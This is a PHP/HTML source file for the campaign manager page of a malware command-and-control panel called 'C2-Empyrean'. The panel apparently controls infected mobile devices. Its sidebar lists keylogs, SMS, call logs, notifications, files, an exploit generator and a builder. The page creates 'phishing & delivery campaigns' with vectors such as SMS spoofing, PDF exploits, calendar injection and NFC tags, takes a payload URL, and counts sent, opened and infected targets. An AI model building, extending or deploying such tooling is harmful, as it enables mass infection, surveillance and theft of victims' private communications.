<?php
require_once __DIR__ . '/../middleware.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Campaign Manager - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }
        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
        }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }
        .header-actions { display: flex; gap: 12px; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px; cursor: pointer;
            text-decoration: none; transition: all 0.2s;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }
        .header-btn.primary { background: linear-gradient(135deg, #7b2ff7, #00d4ff); border: none; color: #fff; }

        .campaign-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 16px;
        }

        .campaign-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 14px;
            padding: 20px;
            transition: all 0.2s;
        }
        .campaign-card:hover { border-color: rgba(255, 255, 255, 0.1); }

        .campaign-card .campaign-header {
            display: flex; justify-content: space-between; align-items: flex-start;
            margin-bottom: 12px;
        }
        .campaign-card .campaign-name { font-size: 16px; font-weight: 600; color: #fff; }
        .campaign-card .campaign-status {
            font-size: 11px; padding: 3px 10px; border-radius: 12px; font-weight: 600;
            display: inline-block;
        }
        .campaign-card .campaign-status.active { background: rgba(52,199,89,0.15); color: #34c759; }
        .campaign-card .campaign-status.paused { background: rgba(255,159,10,0.15); color: #ff9f0a; }
        .campaign-card .campaign-status.completed { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.4); }

        .campaign-card .campaign-stats {
            display: grid; grid-template-columns: 1fr 1fr 1fr;
            gap: 8px; margin: 12px 0;
        }
        .campaign-card .campaign-stats .stat { text-align: center; }
        .campaign-card .campaign-stats .stat-value { font-size: 18px; font-weight: 700; color: #fff; }
        .campaign-card .campaign-stats .stat-label { font-size: 11px; color: rgba(255,255,255,0.3); }

        .campaign-card .campaign-desc { font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom: 12px; }
        .campaign-card .campaign-meta { font-size: 11px; color: rgba(255,255,255,0.2); }

        .campaign-card .campaign-actions { display: flex; gap: 6px; margin-top: 12px; }
        .campaign-card .campaign-actions button {
            padding: 6px 12px; font-size: 11px;
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08);
            border-radius: 6px; color: rgba(255,255,255,0.6); cursor: pointer;
        }
        .campaign-card .campaign-actions button:hover { background: rgba(255,255,255,0.1); }
        .campaign-card .campaign-actions button.danger { color: #ff453a; }
        .campaign-card .campaign-actions button.primary { background: rgba(123,47,247,0.2); color: #7b2ff7; }

        .modal-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.7); backdrop-filter: blur(6px);
            z-index: 9999; display: none; align-items: center; justify-content: center;
        }
        .modal-overlay.show { display: flex; }
        .modal {
            background: #1a1a2e; border: 1px solid rgba(255,255,255,0.08);
            border-radius: 16px; padding: 28px; max-width: 520px; width: 100%;
            max-height: 85vh; overflow-y: auto;
        }
        .modal-title { font-size: 20px; font-weight: 700; color: #fff; margin-bottom: 20px; }
        .modal .form-group { margin-bottom: 14px; }
        .modal .form-group label { display: block; font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom: 6px; }
        .modal .form-group input, .modal .form-group select, .modal .form-group textarea {
            width: 100%; padding: 10px 14px;
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08);
            border-radius: 8px; color: #fff; font-size: 13px; outline: none;
        }
        .modal .form-group input:focus, .modal .form-group select:focus, .modal .form-group textarea:focus { border-color: #7b2ff7; }
        .modal button { padding: 10px 24px; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; border: none; }
        .modal .btn-primary { background: linear-gradient(135deg, #7b2ff7, #00d4ff); color: #fff; }
        .modal .btn-secondary { background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.7); margin-left: 8px; }

        .empty-state { color: rgba(255,255,255,0.2); text-align: center; padding: 60px 20px; grid-column: 1 / -1; }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">
            <div class="sidebar-logo">C2-Empyrean</div>
            <div class="sidebar-section-title">Main</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/dashboard"><span class="icon">📊</span> Dashboard</a></li>
                <li><a href="/admin/devices"><span class="icon">📱</span> Devices</a></li>
                <li><a href="/admin/map_view"><span class="icon">🗺️</span> Map View</a></li>
                <li><a href="/admin/command_console"><span class="icon">⚡</span> Command Console</a></li>
                <li><a href="/admin/analytics"><span class="icon">📈</span> Analytics</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Data</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/keylog_viewer"><span class="icon">⌨️</span> Keylogs</a></li>
                <li><a href="/admin/sms_console"><span class="icon">💬</span> SMS</a></li>
                <li><a href="/admin/call_logs"><span class="icon">📞</span> Call Logs</a></li>
                <li><a href="/admin/notification_viewer"><span class="icon">🔔</span> Notifications</a></li>
                <li><a href="/admin/file_browser"><span class="icon">📁</span> Files</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Actions</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/exploit_generator"><span class="icon">🎣</span> Exploit Generator</a></li>
                <li><a href="/admin/campaign_manager" class="active"><span class="icon">📢</span> Campaigns</a></li>
                <li><a href="/admin/builder"><span class="icon">🔧</span> Builder</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">System</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/settings"><span class="icon">⚙️</span> Settings</a></li>
                <li><a href="/admin/telegram_settings"><span class="icon">🤖</span> Telegram</a></li>
            </ul>
        </nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">📢 Campaign Manager <span>phishing & delivery campaigns</span></h1>
                <div class="header-actions">
                    <button class="header-btn primary" onclick="openCreateModal()">+ New Campaign</button>
                    <button class="header-btn" onclick="refreshCampaigns()">🔄 Refresh</button>
                </div>
            </div>

            <div class="campaign-grid" id="campaignGrid">
                <div class="empty-state">Loading campaigns...</div>
            </div>
        </main>
    </div>

    <div class="modal-overlay" id="createModal">
        <div class="modal">
            <div class="modal-title">Create New Campaign</div>
            <div class="form-group">
                <label>Campaign Name</label>
                <input type="text" id="campName" placeholder="e.g., Q3 Phishing Wave">
            </div>
            <div class="form-group">
                <label>Description</label>
                <textarea id="campDesc" rows="3" placeholder="Campaign objectives..."></textarea>
            </div>
            <div class="form-group">
                <label>Delivery Vector</label>
                <select id="campVector">
                    <option value="sms">SMS Spoof</option>
                    <option value="qr">QR Code</option>
                    <option value="pdf">PDF Exploit</option>
                    <option value="pwa">PWA WebAPK</option>
                    <option value="calendar">Calendar Injection</option>
                    <option value="bluetooth">Bluetooth Push</option>
                    <option value="nfc">NFC Tag</option>
                </select>
            </div>
            <div class="form-group">
                <label>Payload URL</label>
                <input type="text" id="campUrl" placeholder="https://your-panel.com/payload">
            </div>
            <div class="form-group">
                <label>Target Device Filter (optional)</label>
                <input type="text" id="campFilter" placeholder="e.g., country:US OR all">
            </div>
            <div style="margin-top:20px;display:flex;gap:8px;">
                <button class="btn-primary" onclick="createCampaign()">Create Campaign</button>
                <button class="btn-secondary" onclick="closeCreateModal()">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', refreshCampaigns);

        async function refreshCampaigns() {
            try {
                const r = await fetch('/api/campaigns/list', {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await r.json();
                if (!result.success) {
                    if (result.code === 401) { window.location.href = '/admin/login'; return; }
                    return;
                }
                renderCampaigns(result.data.campaigns || []);
            } catch (err) {}
        }

        function renderCampaigns(campaigns) {
            const grid = document.getElementById('campaignGrid');
            if (campaigns.length === 0) {
                grid.innerHTML = '<div class="empty-state">No campaigns yet. Click "+ New Campaign" to start.</div>';
                return;
            }
            grid.innerHTML = campaigns.map(c => {
                const statusClass = c.status === 'active' ? 'active' : c.status === 'paused' ? 'paused' : 'completed';
                const total = (c.sent || 0) + (c.opened || 0) + (c.infected || 0);
                return `
                    <div class="campaign-card">
                        <div class="campaign-header">
                            <div class="campaign-name">${c.name}</div>
                            <span class="campaign-status ${statusClass}">${c.status || 'draft'}</span>
                        </div>
                        <div class="campaign-desc">${c.description || '—'}</div>
                        <div class="campaign-stats">
                            <div class="stat"><div class="stat-value">${c.sent || 0}</div><div class="stat-label">Sent</div></div>
                            <div class="stat"><div class="stat-value">${c.opened || 0}</div><div class="stat-label">Opened</div></div>
                            <div class="stat"><div class="stat-value">${c.infected || 0}</div><div class="stat-label">Infected</div></div>
                        </div>
                        <div class="campaign-meta">Vector: ${c.vector || '—'} · Created: ${formatTime(c.created_at)}</div>
                        <div class="campaign-actions">
                            <button class="primary" onclick="toggleCampaign('${c.id}')">${c.status === 'active' ? '⏸️ Pause' : '▶️ Activate'}</button>
                            <button onclick="duplicateCampaign('${c.id}')">📋 Duplicate</button>
                            <button class="danger" onclick="deleteCampaign('${c.id}')">🗑️ Delete</button>
                        </div>
                    </div>
                `;
            }).join('');
        }

        function openCreateModal() { document.getElementById('createModal').classList.add('show'); }
        function closeCreateModal() { document.getElementById('createModal').classList.remove('show'); }

        async function createCampaign() {
            const data = {
                name: document.getElementById('campName').value,
                description: document.getElementById('campDesc').value,
                vector: document.getElementById('campVector').value,
                payload_url: document.getElementById('campUrl').value,
                target_filter: document.getElementById('campFilter').value
            };
            if (!data.name) { alert('Campaign name is required'); return; }
            const r = await fetch('/api/campaigns/create', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                body: JSON.stringify(data)
            });
            const result = await r.json();
            if (result.success) { closeCreateModal(); refreshCampaigns(); }
            else alert(result.error || 'Error');
        }

        async function toggleCampaign(id) {
            await fetch('/api/campaigns/toggle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                body: JSON.stringify({ id: id })
            });
            refreshCampaigns();
        }

        async function deleteCampaign(id) {
            if (!confirm('Delete this campaign?')) return;
            await fetch('/api/campaigns/delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                body: JSON.stringify({ id: id })
            });
            refreshCampaigns();
        }

        async function duplicateCampaign(id) {
            await fetch('/api/campaigns/duplicate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                body: JSON.stringify({ id: id })
            });
            refreshCampaigns();
        }

        function formatTime(ts) { if (!ts) return '—'; return new Date(ts * 1000).toLocaleString(); }
        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
